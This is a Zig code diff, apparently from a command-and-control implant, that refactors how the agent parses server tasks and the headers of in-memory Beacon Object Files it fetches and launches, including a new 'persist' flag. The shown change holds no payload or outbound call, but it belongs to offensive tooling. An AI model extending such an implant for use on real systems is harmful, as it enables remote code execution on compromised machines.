@@ -134,6 +134,19 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     } else null;
     defer if (bof_args) |args| allocator.free(args);
 
+    // process header
+    const bof_header = root.object.get("header").?.string;
+    var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');
+
+    const exec_mode = bof_header_iter.next() orelse return error.BadData;
+    const args_spec = bof_header_iter.next() orelse return error.BadData;
+    _ = args_spec;
+
+    const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;
+    _ = is_persistent;
+
+    // TODO: handle 'buffers'
+
     const bof_path = root.object.get("path").?.string;
 
     // fetch bof content
@@ -142,13 +155,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
     const bof_object = try bof.Object.initFromMemory(bof_content);
     errdefer bof_object.release();
-
-    // process header
-    const bof_header = root.object.get("header").?.string;
-    var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
-    const exec_mode = iter_hdr.next() orelse return error.BadData;
-    //TODO: handle 'buffers'
-    //const args_spec = iter_hdr.next() orelse return error.BadData;
 
     var bof_context: ?*bof.Context = null;
 
@@ -179,7 +185,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
             .context = context,
             .request_id = try allocator.dupe(u8, root.object.get("id").?.string),
         });
-    } else bof_object.release();
+    } else return error.FailedToRunBof;
 }
 
 fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
@@ -220,7 +226,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         const task = root.object.get("name").?.string;
         const request_id = root.object.get("id").?.string;
 
-        var iter_task = std.mem.tokenize(u8, task, ":");
+        var iter_task = std.mem.splitScalar(u8, task, ':');
         const cmd_prefix = iter_task.next() orelse return error.BadData;
         const cmd_name = iter_task.next() orelse return error.BadData;
 
